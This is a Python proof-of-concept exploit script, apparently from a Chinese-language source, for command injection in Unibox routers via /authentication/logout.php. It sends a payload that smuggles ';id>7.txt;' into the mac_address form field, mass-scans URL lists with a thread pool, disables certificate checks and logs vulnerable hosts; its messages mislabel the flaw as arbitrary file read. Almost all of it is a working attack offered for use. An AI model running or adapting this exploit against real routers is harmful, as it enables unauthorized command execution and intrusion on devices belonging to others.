import argparse,sys,requests,json
import urllib3
import re
import warnings
from multiprocessing.dummy import Pool # 多线程的库
from urllib.parse import urlparse
# 禁用不安全请求警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def banner():
    test = """
________    _______  ________                    
\______ \   \      \ \______ \     _____   ____  
 |    |  \  /   |   \ |    |  \   /     \ /  _ \ 
 |    `   \/    |    \|    `   \ |  Y Y  (  <_> )
/_______  /\____|__  /_______  / |__|_|  /\____/ 
        \/         \/        \/        \/             
                 
        Unibox路由器 /authentication/logout 存在远程命令执行 POC         By:DND mo
"""
    print(test)

def main():
    banner()

    #初始化
    parse = argparse.ArgumentParser(description="Unibox路由器 /authentication/logout 存在远程命令执行 POC")

    # 添加命令行参数
    parse.add_argument('-u','--url',dest='url',type=str,help='please input your link')
    parse.add_argument('-f','--file',dest='file',type=str,help='please input your file')

    # 实例化
    args = parse.parse_args()

    # 对用户输入的参数做判断 输入正确 url file 输入错误弹出提示
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 多线程处理
        url_list = [] # 用于接收读取文件之后的url
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(5)  # 减少线程数避免过多连接
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage python {sys.argv[0]} -h")

def poc(target):
    link = "/authentication/logout.php"
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "45"
    }

    payload = "logout_user=1&mac_address=;id>7.txt;"


    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target

    try:
        res1 = requests.get(url=target,headers=headers,timeout=15,verify=False)
        if res1.status_code == 200:
            res2 = requests.post(url=target+link,data=payload,headers=headers,timeout=15,verify=False)
            #print(res2.text)
            if "User logged out successfully" in res2.text:
                print(f"[+]该{target}存在任意文件读取漏洞")
                # 写入到一个文件中
                with open('result.txt','a+',encoding='utf-8') as f:
                    f.write(f"[+]该{target}存在任意文件读取漏洞\n")
                    f.write(f"  -路径文件位置：{target}/authentication/7.txt\n")
            else:
                print(f"[-] 该 {target} 不存在任意文件读取漏洞，响应状态码: {res2.status_code}")
        else:
            print(f"[-] 目标 {target} 不可访问，状态码: {res1.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[!] 该 {target} 请求失败: {str(e)}")
    except Exception as e:
        print(f"[!] 该 {target} 处理时出现错误: {str(e)}")

# 函数入口

if __name__ == "__main__":
    main()